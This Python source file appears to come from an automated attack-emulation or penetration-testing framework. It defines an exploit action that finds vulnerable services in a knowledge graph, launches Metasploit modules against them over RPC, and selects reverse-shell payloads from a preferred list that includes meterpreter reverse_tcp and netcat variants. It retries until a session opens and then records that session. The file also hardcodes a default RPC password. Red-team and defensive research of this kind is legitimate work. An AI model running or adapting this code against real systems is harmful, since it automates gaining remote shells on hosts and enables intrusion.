import re
import os
import json
from netifaces import ifaddresses, AF_INET, gateways
from pymetasploit3.msfrpc import MsfRpcClient

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager

# Taken from https://docs.rapid7.com/metasploit/working-with-payloads/
preferred_payloads = {
    "windows": [
        "windows/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_nonx_tcp",
        "windows/meterpreter/reverse_ord_tcp",
        "windows/shell/reverse_tcp",
    ],
    "linux": [
        "cmd/unix/reverse",
        "cmd/unix/reverse_perl",
        "cmd/unix/reverse_netcat_gaping",
        "cmd/unix/interact", 
    ],
    "java": [
        "java/meterpreter/reverse_tcp",
    ],
    "php": [
        "php/meterpreter/reverse_tcp",
        "php/meterpreter_reverse_tcp",
    ],
    "ruby": [
        "ruby/shell_reverse_tcp",
    ],
    "other": [   
        "generic/shell_reverse_tcp",
    ]
}

class ExploitAction(Action):
    """Generic class that we'll subclass again for each exploit"""

    def __init__(self, name: str, module_name: str, cves: list, vuln_service: dict):
        super().__init__(name, "T1203", "TA0002", ["loud", "fast"])
        self.noise = 0.8
        self.impact = 0.5
        self.module_name = module_name
        self.cves = cves
        self.vuln_service = vuln_service
        
    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Expected outcome of the action
        """
        cve_or_service = pattern.get('service').get('protocol')
        if pattern.get('vuln'):
            cve_or_service = pattern.get('vuln').get('id')
        return [
            f"Exploit {cve_or_service} on port {pattern.get('port').get('number')} on {pattern.get('asset').get('ip_address')}"
        ]

    def get_target_query(self) -> Query:
        """
        Target query for the action
        """
        asset = Entity('Asset', alias='asset')
        port = Entity('OpenPort', alias='port')
        
        if len(self.vuln_service):
            service = Entity('Service', alias='service', protocol=self.vuln_service["protocol"], version=self.vuln_service["version"])
            pattern = (
                asset.with_edge(Relationship('has'))
                .with_node(port)
                .with_edge(Relationship('is_running'))
                .with_node(service)
            )
            query = Query()
            query.match(pattern)
            query.ret_all()
            return query
        else:
            service = Entity('Service', alias='service')
            vuln = Entity('Vulnerability', alias='vuln')
            pattern = (
                asset.with_edge(Relationship('has'))
                .with_node(port)
                .with_edge(Relationship('is_running'))
                .with_node(service)
                .with_edge(Relationship('exposes'))
                .with_node(vuln)
            )
            query = Query()
            query.match(pattern)
            query.where(vuln.id.is_in(self.cves))
            query.ret_all()
            return query
    
    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute the exploit
        """
        msf = MsfRpcClient(
            os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24"),
            port=int(os.environ.get("MSF_PORT", 55552))
        )

        exploit = msf.modules.use("exploit", self.module_name)
        host = pattern.get('asset').get('ip_address')
        
        if 'RHOST' in exploit.options:
            exploit['RHOST'] = host
        if 'rhost' in exploit.options:
            exploit['rhost'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host
        if 'LHOST' in exploit.options:
            exploit['LHOST'] = ifaddresses(
                gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
            ).setdefault(AF_INET)[0]['addr']
            
        if pattern.get('port') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('port').get('number')
            
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True
        
        if "missing_required" in exploit:
            for option in exploit.missing_required:
                if option in exploit.default_options:
                    exploit[option] = exploit.default_options[option]

        payload = None            
        possible_payloads = exploit.targetpayloads()
        
        if possible_payloads:
            service_type = pattern.get('service').get('protocol').lower()
            if service_type in preferred_payloads:
                for preferred_payload in preferred_payloads[service_type]:
                    if preferred_payload in possible_payloads:
                        payload = msf.modules.use('payload', preferred_payload)
                        break
                    
            os_type = pattern.get('asset').get('os_family').lower()
            if payload is None and os_type in preferred_payloads:
                for preferred_payload in preferred_payloads[os_type]:
                    if preferred_payload in possible_payloads:
                        payload = msf.modules.use('payload', preferred_payload)
                        break
        
            if payload is None:
                for preferred_payload in preferred_payloads["other"]:
                    if preferred_payload in possible_payloads:
                        payload = msf.modules.use('payload', preferred_payload)
                        break
                    
            if payload is None:
                payload = msf.modules.use('payload', possible_payloads[0])
        
            if 'LHOST' in payload.options:
                payload['LHOST'] = ifaddresses(
                    gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
                ).setdefault(AF_INET)[0]['addr']
                
        # Some exploits need executing twice to work
        for _ in range(3):
            if payload:
                output = msf.consoles.console().run_module_with_output(exploit, payload=payload)
            else:
                output = msf.consoles.console().run_module_with_output(exploit)

            matches = re.search(r'session (\d+) opened', output.lower().strip())
            if matches:
                ms_session_id = matches.group(1)
                channel = msf.sessions.session(ms_session_id)
                sess_id = sessions.add_session(channel)
                return ActionExecutionResult(
                    command=["msfrpc", "exploit", self.module_name],
                    stdout=output,
                    session=sess_id,
                    logs=[f"Established session ID {sess_id} (msf session ID is {ms_session_id}) on {host} using msf module {self.module_name}"]
                )
                    
        return ActionExecutionResult(
            command=["msfrpc", "exploit", self.module_name],
            stdout=output,
            exit_status=1,
            logs=[f"Couldn't create msf session on {host} using msf module {self.module_name}"]
        )
        
        
    def capture_state_change(
        self, gdb: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Maybe add the session to the kg
        """
        changes: StateChangeSequence = []
        if output.session:
            host = pattern.get('asset')
            executes_on = host._id
            
            openport = pattern.get('openport')
            service = pattern.get('service')
            if service:
                executes_on = service._id
            elif openport:
                executes_on = openport._id
                
            session = Entity(
                'Session',
                alias='session',
                protocol='msf',
                active=True,
                id=output.session,
                executes_on=executes_on,
            )
            changes.append((None, "merge", session))
        return changes